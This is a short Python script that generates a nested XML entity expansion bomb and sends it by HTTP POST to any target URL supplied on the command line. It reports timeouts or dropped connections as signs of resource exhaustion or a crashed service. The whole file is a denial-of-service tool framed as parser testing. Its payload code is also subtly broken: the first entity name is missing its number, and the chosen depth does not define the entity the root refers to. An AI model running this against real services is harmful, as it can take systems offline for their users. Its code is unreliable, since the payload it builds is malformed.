import sys
import requests

def generate_xml_bomb(nesting_depth=9):
    """Generates a nested XML entity bomb payload for parser testing."""
    doctype = "<!DOCTYPE bomb [\n"
    root_elements = "<bomb>&lol9;</bomb>"
    
    # Build recursive entity definitions
    for i in range(1, nesting_depth + 1):
        if i == 1:
            doctype += f'  <!ENTITY lol"lol">\n'
        else:
            prev = i - 1
            doctype += f'  <!ENTITY lol{i} "&lol{prev};&lol{prev};">\n'
    doctype += "]>"
    
    payload = f'<?xml version="1.0"?>\n{doctype}\n<root>{root_elements}</root>'
    return payload

def test_xml_parser(target_url):
    payload = generate_xml_bomb(nesting_depth=8)
    headers = {"Content-Type": "application/xml"}
    
    print(f"[*] Sending XML entity payload ({len(payload)} bytes) to {target_url}...")
    try:
        response = requests.post(target_url, data=payload, headers=headers, timeout=5)
        print(f"[+] Response Status: {response.status_code}")
        print(f"[+] Response Body: {response.text[:200]}...")
    except requests.exceptions.Timeout:
        print("[!] Target timed out – potential resource exhaustion or blocking parser lock.")
    except requests.exceptions.ConnectionError:
        print("[!] Connection refused / service crashed or dropped.")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python test_xml_bomb.py <http://target-url/api/parse>")
        sys.exit(1)
    test_xml_parser(sys.argv[1])
